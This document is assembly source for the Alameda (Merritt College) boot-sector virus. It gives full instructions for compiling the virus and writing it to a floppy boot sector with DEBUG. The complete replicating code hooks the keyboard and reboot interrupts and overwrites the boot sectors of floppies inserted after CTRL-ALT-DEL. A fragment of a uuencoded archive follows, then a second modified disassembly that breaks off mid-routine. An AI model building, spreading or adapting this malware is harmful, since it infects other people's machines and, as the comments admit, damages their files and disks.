;*******************************************************************************
;**                                                                           **
;**    THE ALAMEDA, OR MERRITT COLLEGE VIRUS                                  **
;**                                                                           **
;*******************************************************************************

;This is the Alameda College Virus, otherwise known as the Merrit College Virus.
;It was originally found in the spring of 1988 on computers at Merrit and
;Alameda Colleges. The original used the "POP CS" instruction to jump to high
;memory, which causes a fault on 80286 and 80386 based machines. This version
;has been improved to eliminate that problem, so it will work on all PC's, be
;they XT's, AT's, 80386's PS/2's or any kind of clone.
;
;This is a simple boot sector virus which lives through the CTRL-ALT-DEL reboot
;sequence. When a disk with this virus on it is booted, the virus is the first
;thing to be loaded. It copies itself to high memory and decrements the BIOS
;memory size variable at 0000:0413H to reserve space for itself in the machine.
;It intercepts the keyboard handler, interrupt 9, and the reboot vector,
;interrupt 19. When it finds a CTRL-ALT-DEL, it activates, rather than allowing
;the BIOS to execute the reboot sequence. When it activates, it simulates a
;reboot, and examines the disk in drive A to see if it is already there. If
;so, it loads the original boot sector, which is stored at Track 39, Head 0,
;Sector 8, and executes it, forfeiting control until the next CTRL-ALT-DEL.
;If the disk does not have the virus there, the virus copies the boot sector on
;it to Track 39, Head 0, Sector 8, and puts itself in place of the original
;boot sector on that disk. This completes the replication cycle. It will also
;copy the infection counter from high memory to the BIOS data area at 0040:0072
;when CTRL-ALT-I is pressed.
;
;This virus does not cause any intentional harm to the system in which it is
;resident, however it can cause inadvertent harm in a number of ways:
;
;  (1) When it infects a disk, it will overwrite Track 39, Head 0, Sector 8,
;      regardless of what might be there. On a full disk, this sector will be
;      in use by some file, so that file will be damaged.
;  (2) When the virus is resident, one cannot do a CTRL-ALT-DEL and boot from
;      a hard drive. An error message will result, or BASIC will be loaded.
;  (3) On an infected boot disk, when the disk is filled up and the original
;      boot sector, now at Track 39, Head 0, Sector 8, is overwritten, the
;      disk can no longer be booted.
;
;This program can be compiled with MASM, linked with LINK, and loaded onto a
;floppy disk with DEBUG. The process is as follows:
;
; (1) Format a clean floppy disk, to the 360KB format, using the /S option to
;     get the system files on the disk.
; (2) Copy the COMMAND.COM file onto the newly formatted disk.
; (3) Compile the ALAMEDA.ASM file using "MASM ALAMEDA,,;".
; (4) Link the program using "LINK ALAMEDA,,;".
;     Now you should have a file ALAMEDA.EXE on disk which is 32768 bytes long.
; (5) Enter the debugger as "DEBUG ALAMEDA.EXE".
; (6) Set the CX register to 200 using the command "R CX". You will get a
;     display of the current CX value and a colon. Type "200" at the colon.
; (7) Now load the original boot sector into memory using the command
;     "L 100 0 0 1" for drive A and "L 100 1 0 1" for drive B. (You may type
;     "D 100" to see this boot sector.)
; (8) Save that sector at Track 39, Head 0, Sector 8 using the command
;     "W 100 0 2C5 1" for drive A and "W 100 1 2C5 1" for drive B.
; (9) Save the Alameda virus at Track 0, Head 0, Sector 1 using the command
;     "W 7C00 0 0 1" for drive A and "W 7C00 1 0 1" for drive B. That's it.
;     Exit debug using the command "E".
; (10) The next time you boot from that disk, the virus will be operational.
;     Watch out! USE IT AT YOUR OWN RISK! YOU ARE RESPONSIBLE IF YOU INFECT
;     SOMEONE'S COMPUTER WITH IT! Label the disk right now.
;
;The files ALAMEDA.BAT, ALAMEDA.FMT, ALAMEDA.DBG, ALAMEDABDBG, along with MASM,
;COMMAND, LINK, FORMAT, and DEBUG (and this file) automate this process. Just
;put a disk in drive A or B and type "ALAMEDA A" or "ALAMEDA B" to install on
;drives A and B, respectively. "ALAMEDA AE" or "ALAMEDA BE" will install from
;the EXE file without recompiling; then you can do without MASM and LINK.

;*******************************************************************************
;LOWMEM is an absolute segment defined for the sole purpose of doing a far jump
;to 0000:7C00. This is required when the Virus loads the original boot sector
;and transfers control to it from high memory.

LOWMEM          SEGMENT AT 0
                ASSUME  CS:LOWMEM

                ORG     7C00H
BOOTSEC:        DB      (?)                     ;Label to jump to.

LOWMEM          ENDS


;*******************************************************************************
;BIOSDAT is the data segment starting at 0040:0000 where the ROM BIOS stores
;vital system data, etc. We need to use some of this data when installing the
;virus, and when it is reproducing. This segment is not always used by the
;virus when accessing BIOS data. Instead of using the address 0040:00XX, it
;sometimes uses 0000:04XX instead. This segment could be eliminated entirely,
;and only the latter addressing scheme used, but the author chose not to.

BIOSDAT         SEGMENT AT 0040H

                ORG     13H
TOM             DW      (?)                     ;Computer memory size, in Kilobytes

                ORG     17H
KBSHIFT         DB      (?)                     ;This byte keeps track of shift and LED states

                ORG     72H
BCOUNT          DW      (?)                     ;This area is normally used to signal that a CTRL-ALT-DEL
                                                ;reboot is in process, being set to 1234H when that is the case.
                                                ;However, the virus uses it to store an infection count instead.
BIOSDAT         ENDS


;*******************************************************************************
;BIOSROM is a code segment starting at F000:0000 where the ROM is located.
;There is one location, F000: to jump to on true IBM machines which will
;emulate the reboot operation more exactly than this virus can by itself, so
;the virus checks that location to see if this is the right ROM, and then jumps
;there on reboot if it is the right ROM. Here, we have to define that location.

BIOSROM         SEGMENT AT 0F000H
                ASSUME CS:BIOSROM

IBM_ROM         EQU     21E4H                   ;The code at ROM_BOOT in an IBM ROM

                ORG     0E502H
ROM_BOOT:       DW      (?)                     ;Location to check and jump to

BIOSROM         ENDS


;*******************************************************************************
;MAIN is a segment which serves several purposes. It allows access to both the
;interrupt vectors and to the BIOS data, and it also contains the executable
;virus code to be placed in the boot sector. It is possible to use it for all
;of these purposes at once because the boot sector is loaded and executed at
;address 0000:7C00, so when loaded, the segment is located at 0. The first 400H
;bytes of this segment are thus the interrupt vectors, and the BIOS data starts
;at 400H. Executable code starts at 7C00H.

MAIN            SEGMENT BYTE
                ASSUME  CS:MAIN,DS:MAIN,ES:MAIN,SS:MAIN


;Interrupt vectors
                ORG     24H
INT9VEC         DD      (?)                     ;The Interrupt 9 (Keyboard input handler) Vector

                ORG     64H
INT19VEC        DD      (?)                     ;The Interrupt 19H (Reboot sequence) Vector


;BIOS Data
                ORG     410H
EQUIP_FLG       DW      (?)                     ;The BIOS equipment flag (used to see if floppy disks are available)

                ORG     413H
TOM2            DW      (?)                     ;BIOS Memory Size variable (duplicated in BIOSDAT, used with 2 different segments)


;Executable code
                ORG     7C00H

STACK           LABEL   WORD                    ;label for initializing stack pointer

VIRUS:
                jmp     V2
                db      49H,42H,4DH,20H,20H,33H,2EH,33H,00H,02H,02H,01H,00H
                db      02H,70H,00H,0D0H,02H,0FDH,02H,00H,09H,00H,02H,00H,00H,00H,00H,00H
                db      00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,00H,12H
                db      00H,00H,00H,00H,01H,00H
V2:
                cli                             ;interrupts off until stack set up
                xor     ax,ax
                mov     ss,ax                   ;set up stack with 0000:7C00 as the top
                mov     sp,OFFSET STACK
                sti                             ;ok, interrupts on
                mov     bx,40H
                mov     ds,bx                   ;set ds=BIOSDAT

        ASSUME  DS:BIOSDAT                      ;and tell compiler

                mov     ax,[TOM]                ;get memory size in kb
                mul     bx                      ;a nasty little trick here to get the segment count in ax
                                                ;ax = # of 400H (1KB) size blocks of memory, bx = 40H, ax*bx = # of 10H size blocks
                sub     ax,07E0H                ;segment required to execute this program
                                                ;at offset 7C00H, leaving 200H of space for the code
                mov     es,ax                   ;es = high memory segment to move the virus to
                                                ;as far as compiler is concerned, this is still MAIN
                push    cs                      ;set DS=CS(=0, MAIN)
                pop     ds

        ASSUME  DS:MAIN                         ;and tell the compiler

                cmp     di,3456H                ;if the virus is rebooting, this will be 3456H
                jne     SHORT VIRUS_1           ;else, don't decrement infect counter
                dec     WORD PTR [COUNTER]      ;then decrement counter
VIRUS_1:        mov     si,sp                   ;prepare to copy self to top of memory
                mov     di,si
                mov     cx,200H                 ;length of sector to copy (512 bytes)
                rep     movsb                   ;and do the move
                mov     si,cx                   ;set si=0, since cx=0 after move
                mov     di,OFFSET VIRUS - 80H   ;prepare to save the first 32 interrupt vectors in a special table
                mov     cx,80H                  ;just below this code
                rep     movsb                   ;and do the save

                call    GRAB_INT9               ;redirect keyboard interrupt 9 through virus

                mov     ax,OFFSET HI_ENTRY      ;set up high memory address on stack
                push    es                      ;to jump to
                push    ax
                retf                            ;and jump to it using far return

HI_ENTRY:                                       ;when we get here, we are in high memory
                push    ds                      ;es=ds=0
                pop     es

                mov     bx,sp                   ;now prepare to load real boot sector to 7C00
                mov     dx,cx                   ;dx=cx=0, bx=7C00
                mov     cx,2708H                ;prepare for bios call to read
                mov     ax,0201H                ;track 39 sector 8 head 0
                int     13H                     ;and do it
                jb      $                       ;if an error reading it, loop here indefinitely, hanging the system
                jmp     BOOT_JUMP               ;if ok, go execute original boot sector


;Take control of the keyboard interrupt by setting the interrupt 9 vector to
;point to the routine INT9 in the virus here, and by placing a far jump to the
;old interrupt 9 handler at OLD_INT9. The far jump address is dynamically
;determined by this routine, from the old interrupt 9 vector.
GRAB_INT9:
                dec     WORD PTR [TOM2]         ;decrement the top of memory segment so DOS wont overwrite virus when it loads a program
                mov     si,4*9                  ;point to old interrupt 9 vector
                mov     di,OFFSET OLD_INT9      ;and location to put far jump at
                mov     al,0EAH                 ;put far jump instruction (EA) at OLD_INT9 first
                stosb
                mov     cx,4
                rep     movsb                   ;and then the address from the old int 9 vector
                mov     WORD PTR [INT9VEC],OFFSET INT9
                mov     WORD PTR [INT9VEC+2],es ;and set up new interrupt vector to point to INT9
                ret


;Reset keyboard shift register to prepare it to accept another character, when
;CTRL-ALT-DEL sequence is complete. Normally this is handled by BIOS, but we
;want to circumvent the BIOS when CTRL-ALT-DEL is pressed. Although there is
;no shift register to reset on an AT, this will do no harm.
;
SR_RESET:
                in      al,61H                  ;just toggle bit 8, port 61H
                mov     ah,al                   ;real fast
                or      al,80H
                out     61H,al
                xchg    al,ah
                out     61H,al
                jmp     REBOOT                  ;and go execute false reboot sequence


;Keyboard interrupt 9 handler. Whenever a key is pressed on the keyboard,
;control is passed through this section of code. It monitors the keyboard
;to determine if CTRL-ALT-DEL is being pressed. If not, control is just passed
;on to the normal BIOS interrupt handler. In the event that CTRL-ALT-DEL is
;down, the virus intercepts further processing of the keyboard, and goes into
;its simulation of a reboot. Information about key states is kept in KEY_STATE.
;
INT9:
                sti                             ;interrupts on
                push    ax                      ;save these temporarily
                push    bx
                push    ds
                push    cs                      ;set ds=cs
                pop     ds
                mov     bx,[KEY_STATE]          ;get keystate info
                in      al,60H                  ;read the byte coming in from the keyboard
                mov     ah,al                   ;and copy it to ah
                and     ax,887FH                ;strip 8th bit in al, keep only 8th bit in ah
                cmp     al,1DH                  ;is it the scan code for CTRL?
                jne     INT9_1                  ;nope, continue this check
                mov     bl,ah                   ;yes, bl=8 on key down, 88H on key up
                jmp     INT9_3                  ;and go update KEY_STATE
INT9_1:         cmp     al,38H                  ;is it the scan code for ALT?
                jne     INT9_2                  ;nope, continue this check
                mov     bh,ah                   ;yes, bh=8 on key down, 88H on key up
                jmp     INT9_3                  ;and go update KEY_STATE
INT9_2:         cmp     bx,0808H                ;are ctrl and alt both down?
                jne     INT9_3                  ;no - continue processing
                cmp     al,17H                  ;if CTRL_ALT-I then go put infection counter in BIOSDAT
                je      INT9_X0
                cmp     al,53H                  ;else, is it DEL?
                je      SR_RESET                ;yes - reset keyboard shift register and do reboot sequence
INT9_3:         mov     [KEY_STATE],bx          ;else save current key state for next time
INT9_4:         pop     ds                      ;get everything off the stack
                pop     bx
                pop     ax
OLD_INT9:       db      5 dup (0)               ;and go jump to the BIOS keyboard handler to handle normal keystrokes
                                                ;(This db is set up with a far jump by GRAB_INT9)
INT9_X0:        jmp     INT9_X1                 ;need a near jump to get to this


;Reboot sequence
REBOOT:
                mov     dx,03D8H                ;disable video by out-ing 0 to 3D8H
                mov     ax,800H                 ;set up ah=8 for call to delay below
                out     dx,al
                call    DELAY                   ;short time delay before proceeding with reboot
                mov     [KEY_STATE],ax          ;zero this flag (ah=0 on return from DELAY) to reset key state
                mov     al,3                    ;select 80x25 color video (ah=0)
                int     10H                     ;select video mode via BIOS
                mov     ah,2                    ;set cursor position to 0,0
                xor     dx,dx
                mov     bh,dh                   ;on page 0
                int     10H                     ;using BIOS
                mov     ah,1
                mov     cx,0607H                ;set cursor start and stop lines
                int     10H                     ;using BIOS
                mov     ax,420H                 ;do a longer delay, al=20H for EOI follwing delay
                call    DELAY
                cli                             ;turn interrupts off now
                out     20H,al                  ;clear 8259 interrupt controller
                mov     es,cx                   ;es=cx=0 (cx=0 from DELAY)
                mov     di,cx                   ;prepare to restore 32 interrupt vectors to 0:0
                mov     cx,80H                  ;from ds:7B80 (and ds=cs here)
                mov     si,OFFSET VIRUS - 80H
                rep     movsb                   ;and move them
                mov     ds,cx                   ;ds=cx=0 now
                mov     WORD PTR [INT19VEC],OFFSET INT19
                mov     WORD PTR [INT19VEC+2],cs;set up new interrupt 19 handler vector
                mov     ax,40H
                mov     ds,ax                   ;set ds = BIOS data area

        ASSUME  DS:BIOSDAT                      ;and tell the compiler

                mov     [KBSHIFT],ah            ;zero keyboard shift states
                inc     WORD PTR [TOM]          ;increment memory size word so we don't start consuming memory
                push    ds
                mov     ax,SEG BIOSROM          ;set up DS=segment BIOSROM
                mov     ds,ax

        ASSUME  DS:BIOSROM                      ;and tell the compiler

                cmp     WORD PTR [ROM_BOOT],IBM_ROM     ;is it an IBM BIOS?
                pop     ds                      ;restore ds before we do anything

        ASSUME  DS:BIOSDAT                      ;and tell compiler

                je      REBOOT_1                ;yes, IBM, go do a far jump to it
                int     19H                     ;no, reboot using (viral) interrupt 19H

REBOOT_1:       jmp     FAR PTR ROM_BOOT        ;go to IBM BIOS reboot sequence

;Interrupt 19H handler. This is the reboot interrupt, which the virus also
;replaces so that it gains control when a reboot is attempted. This routine
;normally attempts to reload the boot sector from a floppy drive and execute it.
;If a valid boot sector is not found, the BASIC loader is attempted with Int 18H.
;In the virus, though, it attempts to read it, and if successful it checks the
;boot sector to see if it is the virus. If it is, all is fine, and control is
;passed to it. If it isn't, the old boot sector is moved and replaced, and then
;control is passed to it.
;
INT19:
                xor     ax,ax
                mov     ds,ax                   ;ds=0

        ASSUME  DS:MAIN                         ;tell compiler

                mov     ax,[EQUIP_FLG]          ;get equipment flag
                test    al,1                    ;if floppy drives, go on
                jnz     INT19_2                 ;jump if a floppy is found to load or infect
INT19_1:        push    cs                      ;else we want to load BASIC through Int 18H
                pop     es                      ;es=cs=high MAIN
                call    GRAB_INT9               ;set up keyboard interrupt again
                int     18H                     ;and load basic, so virus is still active

INT19_2:        mov     cx,4                    ;floppy found, set up retry count
INT19_3:        push    cx                      ;save retry count
                mov     ah,0
                int     13H                     ;reset floppy disk subsystem
                mov     ax,201H                 ;and read the boot sector
                push    ds
                pop     es                      ;es=0
                mov     bx,OFFSET VIRUS         ;es:bx buffer to load boot sector into
                mov     cx,1                    ;1 track to read, head 0 track 0 sector 1
                xor     dx,dx
                int     13H                     ;read it
                pop     cx                      ;restore retry count
                jnc     INT19_4                 ;fine, it worked, go on
                loop    INT19_3                 ;otherwise try again
                jmp     INT19_1                 ;unless retry count expired, then load BASIC

INT19_4:        cmp     di,3456H                ;ok, if this flag is not set,
                jnz     INFECT                  ;then infect the disk

BOOT_JUMP:      jmp     FAR PTR BOOTSEC         ;else go execute boot sector


;This routine checks the boot sector at 0:7C00 with this one, at cs:7C00 to see
;if they are the same. If they are, fine and good, Int 19 is reexecuted and
;control is passed to the boot sector (virus). If not, the sector is moved and
;replaced instead.
;
INFECT:
                mov     si,OFFSET VIRUS         ;compare boot sector just loaded with this program
                mov     cx,OFFSET OLD_INT9 - OFFSET VIRUS - 1
                mov     di,si
                push    cs
                pop     es                      ;es = high MAIN
                cld
                repe    CMPSB
                je      INF_2                   ;equal, go do reboot, else infect it first

                inc     WORD PTR es:[COUNTER]   ;increment infection counter
                mov     dx,0
                mov     ch,39
                mov     es,dx                   ;write original boot sector at track 39, sector 8, head 0
                mov     bx,OFFSET VIRUS         ;es;bx = location of original boot sector
                mov     cl,8
                mov     ax,0301H                ;write = function 3, int 13H
                int     13H                     ;do it
                push    cs
                pop     es                      ;es=cs
                jc      INF_3                   ;if error, then go execute original boot code, whatever it is
                mov     cx,1                    ;now write infected boot sector to head 0, track 0, sector 1
                mov     ax,301H                 ;which is located here
                mov     dx,0
                int     13H                     ;do it
                jc      INF_3                   ;if error, go execute original boot code

INF_2:          mov     di,3456H                ;disk infected now, so set infected flag
                int     19H                     ;and do reboot interrupt

INF_3:          call    GRAB_INT9               ;an error - set interrupt 9 up again
                dec     WORD PTR es:[COUNTER]   ;decrement counter, because it didn't infect
                jmp     BOOT_JUMP               ;and execute original boot code


;Control gets transfered here from INT9 when CTRL-ALT-I is pressed.
INT9_X1:        mov     [KEY_STATE],bx          ;save the current key state
                mov     ax,[COUNTER]            ;get the infection counter
                mov     bx,40H
                mov     ds,bx                   ;ds=BIOSDAT

        ASSUME  DS:BIOSDAT                      ;tell compiler

                mov     [BCOUNT],ax             ;and save it in the BIOS data area
                jmp     INT9_4                  ;then go transfer control to old int 9 handler


;Execute a short delay. ah:cx = loop count
DELAY:
                sub     cx,cx                   ;zero cx
                loop    $                       ;and loop, decrementing cx, until it's zero again
                sub     ah,1                    ;decrement ah
                jnz     DELAY                   ;and loop until it's zero
                ret


;Data area
COUNTER         DW      0                       ;this is the infection counter
KEY_STATE       DW      0                       ;this tracks the state of the CTRL and ALT keys


                ORG     7DFEH

                DB      55H,0AAH                ;boot sector ID code

MAIN            ENDS


                END VIRUS                       ;end of program, start = VIRUS


begin 664 alameda.tar
M86QA;65D82\`````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M`````````````#`P,#`W-S4`,#`P,#`'
MCL`.'X'_5C1U!/\.]7V+](O^N0`"\Z2+\;^`>[F``/.DZ!D`N'9\!E#+'@>+
MW(O1N0@GN`$"S1-R_ND&`?\.$P2^)`"_[7RPZJJY!`#SI,<&)`"U?(P&)@##
MY&&*X`R`YF&&Q.9AZT&0^U!3'@X?BQ[W?>1@BN`E?X@\'74%BMSK&)`\.'4%
MBOSK#Y"!^P@(=0@\%W00/%-TP(D>]WT?6U@``````.GD`+K8`[@`".[H[`"C
M]WVP`\T0M`(STHK^S1"T`;D'!LT0N"`$Z-``^N8@CL&+^;F``+Z`>_.DCMG'
M!F0`67V,#F8`N$``CMB()A<`_P83`!ZX`/".V($^`N7D(1]T`LT9Z@+E`/`S
MP([8H1`$J`%U!PX'Z"#_S1BY!`!1M`#-$[@!`AX'NP!\N0$`,]+-$UES!.+G
MZ]N!_U8T=07J`'P``+X`?+GL`(O^#@?\\Z9T)R;_!O5]N@``M2>.PKL`?+$(
MN`$#S1,.!W(2N0$`N`$#N@``S1-R!;]6-,T9Z+?^)O\.]7WKMHD>]WVA]7V[
M0`".VZ-R`.G__BO)XOZ`[`%U]\,```````````!5JF%L86UE9&$O<75I8VLN
M8F%T````````````````````````````````````````````````````````
M```````````````````````````````````````````````````````P,#`P
M-S<-"AH`````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M``````````````````````````!A;&%M961A+V=E=&)O;W0N9&)G````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````,#`P,#

;;;;;;;;;;;;;;;;;;;

;alemeda virus                          last modified 11/04/93  

;IS MODIFIED IN THAT THE JUMP TO HIGH MEM IS NOT POP CS BUT A IRET
;THE VIRUS GOES RESIDENT BY MOVING ITSELF TO TOP OF MEM 
;BELOW 640 AT SAME OFFSET DECREMENTING 1K FROM TOTAL MEM

;SAVE ORGINAL BOOT
;AT TRACK 39 SIDE 0 SECTOR 8

;ONLY INFECTS FLOPPY ON CRTL-ALT-DEL

;close to orginal file which didn't work as possible
;except for the pop cs command which is set up as a iret

 
MEM_SIZE1       equ     0413h                    ;*
MEM_SIZE        equ     0013h
KEY_FLAGS       equ     0017h

INT09_OFF       equ     0024h
INT09_SEG       equ     0026h

INT19_OFF       equ     0064h
INT19_SEG       equ     0066h

WARMBT_FLAG     equ     0072h
EQUIP_LST       equ     0410h                    ;*

  
     

seg_a           segment byte 
                assume  cs:seg_a, ds:seg_a


                org     100h
begin:          jmp     near ptr start

                ORG     7C00H

start:
                cli                             ; Disable interrupts
                xor     ax,ax                   ; Zero register
                mov     ss,ax
                mov     sp,7C00h
                sti                             ; Enable interrupts
                mov     bx,40h
                mov     ds,bx
                mov     ax,ds:MEM_SIZE          ;
                mul     bx                      ; dx:ax = reg * ax
                sub     ax,7E0h
                mov     es,ax
                
                push    cs                      ;SET DS = CS = 000
                pop     ds                      ;
                
                cmp     di,3456H             ;IF VIRUS REBOOTING
                jne     NOT_RESIDENT            ; Jump if not equal
                
                dec     word ptr ds:I_CNTER    ;COUNTER

NOT_RESIDENT:
                mov     si,sp                   ;7C00H MOVE VIRUS HI
                mov     di,si                   ;
                mov     cx,200h                 ;
                cld                             ; Clear direction
                rep     movsb                   ; Rep when cx >0 
                                                ; Mov [si] to es:[di]
                
                mov     si,cx                   ; SAVE FIRST 32 INT VECTORS
                mov     di,7c00h-80h            ; 7b80h
                mov     cx,80h                  ;
                rep     movsb                   ; Rep when cx >0 
                                                ; Mov ds:[si] to es:[di]
                call    HOOK_INT09
                
                PUSHF
                push    es
                mov     ax,OFFSET himem
                PUSH    ax
                IRET
                
                ;push    es
                ;pop     cs                      ; Dangerous-8088 only
                ;db      0Fh
himem:                
                push    ds
                pop     es
 
                mov     bx,sp                ; READ ORGINAL BOOT FROM
                mov     dx,cx                 ; FROM FLOPPY
                mov     cx,2708h                ; CH TRK 39, CL SEC 8
                mov     ax,201h                 ; READ AL 1 SECTOR
                int     13h                   ; Disk  dl=drive a  ah=func 02h
                                              ;  read sectors to memory es:bx
                                              ;   al=#,ch=cyl,cl=sectr,dh=head
ERROR1:
                jb      error1
                

                jmp     RE_BOOT


 
HOOK_INT09      proc    near
                dec     word ptr ds:MEM_SIZE1

                mov     si,INT09_OFF
                mov     di, OFFSET ORG_INT09    ;d_7CE9_e
                mov     cx,4
                cli                             ; Disable interrupts
                rep     movsb                   ; Rep when cx >0 
                                                ; Mov [si] to es:[di]

                mov     word ptr ds:INT09_OFF,OFFSET VIR_INT09; 7CAEh
                mov     ds:INT09_SEG,es
                sti                             ; Enable interrupts
                retn
HOOK_INT09          endp


RES_KEYBD:
                in      al,61h                  ; port 61h, 8255 port B, read
                mov     ah,al
                or      al,80h
                out     61h,al                  ; port 61h, 8255 B - spkr, etc
                xchg    ah,al
                out     61h,al                  ; port 61h, 8255 B - spkr, etc
                                                ;  al = 0, disable parity
                jmp     VIR_BOOT
                                                ;* No entry point to code
                
tble1:        
                DB      27H,00H,01,02   
                DB      27H,00H,02,02
                DB      27H,00H,03,02
                DB      27H,00H,04,02
                DB      27H,00H,05,02
                DB      27H,00H,06,02
                DB      27H,00H,07,02
                DB      27H,00H,08,02
                
                ;DW      0024H      
                ;DB      0ADH, 7CH, 0a3h
                DB      26H, 00H, 59H, 5fh
                DB      5EH,07H,1FH
                DB      58H,9DH

 ;*              jmp     far ptr l_0457_0457     ;*
                db      0EAh
                db      57h, 04h, 57h, 04h 
                                                

VIR_INT09:
                pushf                           ; Push flags
                sti                             ; Enable interrupts
                push    ax
                push    bx
                push    ds
                push    cs
                pop     ds
                
                mov     bx,ds:SCAN_CODE          ;ALT_CTRL        
                in      al,60h                  ; port 60h, keybd scan or sw1
                mov     ah,al
                and     ax,887Fh
                
                cmp     al,1Dh                  ; SCAN CODE FOR LEFT_CTRL
                jne     IS_IT_ALT                  ; Jump if not equal
                mov     bl,ah
                jmp     TRY_AGAIN

IS_IT_ALT:
                cmp     al,38h                  ; SCAN CODE FOR LEFT_ALT
                jne     WAS_IT_C_A                  ; Jump if not equal
                mov     bh,ah
                jmp     TRY_AGAIN

WAS_IT_C_A:
                cmp     bx,808h
                jne     TRY_AGAIN                  ; Jump if not equal
                
;WE HAVE PICK UP CTRL AND ALT IS THIS KEY STROKE DELETE OR I                 
;
                
                cmp     al,17h                  ; SCAN CODE FOR I
                je      CTRL_ALT_I              ; Jump if equal
                
                cmp     al,53h                  ; SCAN CODE FOR DEL 
                je      RES_KEYBD                  ; Jump if equal
;
TRY_AGAIN:
                mov     ds:SCAN_CODE,bx


CALL_INT9:
                pop     ds
                pop     bx
                pop     ax
                popf                            ; Pop flags

;*              jmp     far ptr l_F000_0000     ;*
                db      0EAh
ORG_INT09       dw      ? 
                DW      0F000h

CTRL_ALT_I:
                jmp     C_A_I                    ;ctrl-alt-I is pressed



VIR_BOOT:
                mov     dx,3D8h
                mov     ax,800h
                out     dx,al                   ; port 3D8h, CGA video control
                
                call    KILL_TIME
                mov     ds:SCAN_CODE,ax
                
                mov     al,3
                int     10h                     ; Video display   ah=functn 08h
                                                ;  get char al & attrib ah @curs
                mov     ah,2
                xor     dx,dx                   ; Zero register
                mov     bh,dh
                int     10h                     ; Video display   ah=functn 02h
                                                ;  set cursor location in dx
                mov     ah,1
                mov     cx,607h
                int     10h                     ; Video display   ah=functn 01h
                                                ;  set cursor mode in cx
                mov     ax,420h
                call    KILL_TIME         
                cli                             ; Disable interrupts
                out     20h,al                  ; port 20h, 8259-1 int command
                                                ;  al = 20h, end of interrupt
                
                mov     es,cx                   ;  RESTOR INTERUPTS
                mov     di,cx                   ;
                mov     si,7C00H - 80H          ;7B80H  
                mov     cx,80h                  ;
                cld                             ; Clear direction
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                
                mov     ds,cx                                  ; hook INT 19
                mov     word ptr ds:INT19_OFF,OFFSET VIR_INT19  ; 7D55h  
                mov     ds:INT19_SEG,cs                        ;
                
                mov     ax,40h
                mov     ds,ax
                mov     ds:KEY_FLAGS,ah
                inc     word ptr ds:[MEM_SIZE]

; CHECK LOCATION F000H:E502H IF EQUAL TO 21E4H JMP TO F000H:E502H                
; OTHERWISE REBOOT                

                push    ds
                mov     ax,0F000h
                mov     ds,ax
                cmp     word ptr ds:0E502H,21E4h
                pop     ds
                jz      DO_IT                  ; Jump if zero
                int     19h                     ; Bootstrap loader
DO_IT:
;*              jmp     F000:E502H     ;*
                db      0EAh
                dw      0E502h, 0F000h
                                                ;* No entry point to code
VIR_INT19:
                xor     ax,ax                   ; Zero register
                mov     ds,ax
                mov     ax,ds:EQUIP_LST
                test    al,1
                jnz     RD_BOOT                 ; if not FLOPPY DRIVE
                                                ; TRY READ BOOT
GOTO_ROMBASIC:
                push    cs
                pop     es
                call    HOOK_INT09
                int     18h                     ; ROM basic

RD_BOOT:
                mov     cx,4

RD_LOOP:
                push    cx                      ;SAVE ERROR COUNTER
                mov     ah,0
                int     13h                     ; THIS WAS CODED AS INT 0Dh 
                jc      RD_ERROR                 
                
                mov     ax,201h                 ; READ BOOT SECTOR OFF DISK
                push    ds                                ; DRIVE A: TO 0000:7C00H
                pop     es
                mov     bx,7C00H                ;
                mov     cx,1                    ;
                int     13h                     ; Disk  dl=drive a  ah=func 02h
                                                ;  read sectors to memory es:bx
                                                ;   al=#,ch=cyl,cl=sectr,dh=head
RD_ERROR:
                pop     cx
                jnc     CHK_BOOT                  ; Jump if carry=0
                loop    RD_LOOP                  ; Loop if cx > 0

                jmp     short GOTO_ROMBASIC
CHK_BOOT:
                cmp     di,3456H                ;
                jne     CHK_FOR_INFEC                  ; NOT INFECTED YET
RE_BOOT:
;*              jmp     far ptr 0000:7C00     ;*
                db      0EAh
                dw      7C00h, 0
CHK_FOR_INFEC:
                mov     si,7C00H               ;CMP VIRUS TO BOOT SECTOR 
                mov     cx,0e6H                  ;IN QUESTION
                mov     di,si                  ;
                push    cs                     ;
                pop     es                     ;
                cld                             ; Clear direction
                rep    cmpsb                   ; Rep zf=1+cx >0 
                                                ; Cmp [si] to es:[di]
                jz      INFEC_ALREADY                  ; Jump if zero
                
                inc     word ptr cs:I_CNTER     ; INCREMENT INFECT ANOTHER
                
                mov     bx,offset tble1         ;OFFSET tble1 INFO
                mov     dx,0                    ;DRIVE A:
                mov     ch,27h                  ;TRACK 39 
                mov     ah,5                    ;FORMAT 
                jmp     MOV_BOOT                ;DON'T DO ??? 
                
                db       72h, 1Fh

MOV_BOOT:
                mov     es,dx                ;WRITE ORGINAL BOOT
                mov     bx,7C00H             ; TO 
                mov     cl,8                 ;DISK A: TRK 39 SECTOR 8
                mov     ax,301h              ;
                int     13h                  ; Disk  dl=drive a  ah=func 03h
                                             ;  write sectors from mem es:bx
                                             ;   al=#,ch=cyl,cl=sectr,dh=head
                push    cs
                pop     es
                jc      MV_BT_ERROR               ; IF ERROR IN WRITING
                
                mov     cx,1                 ;WRITE VIRUS DOR SEC 1 DRIVE A:
                mov     ax,301h              ;
                int     13h                   ; Disk  dl=drive a  ah=func 03h
                                              ;  write sectors from mem es:bx
                                              ;   al=#,ch=cyl,cl=sectr,dh=head
                jc      MV_BT_ERROR                ; Jump if carry Set
INFEC_ALREADY:
                mov     di,3456H              ;SET FLAG DISK IS INFECTED
                int     19h                   ; Bootstrap loader

MV_BT_ERROR:
                call    HOOK_INT09            ;HOOK INT09
                dec     word ptr cs:I_CNTER   ;WE DID NOT INFECT DEC COUNTER
                jmp     short RE_BOOT         ;BOOT UN-INFECTED DISK


C_A_I:
                mov     ds:SCAN_CODE,bx       ;SAVE SCAN CODE
                mov     ax,ds:I_CNTER         ;PUT COUNTER INTO WARMBT_FLAG
                
                mov     bx,40h                ;MAKE SURE THAT FLAG IS NOT 
                mov     ds,bx                 ;1234H FOR WARM BOOT
                mov     ds:WARMBT_FLAG,ax     ; maybe
                jmp     CALL_INT9

;==========================================================================
;                              SUBROUTINE
;==========================================================================

KILL_TIME       proc    near
                sub     cx,cx
l_02F0:
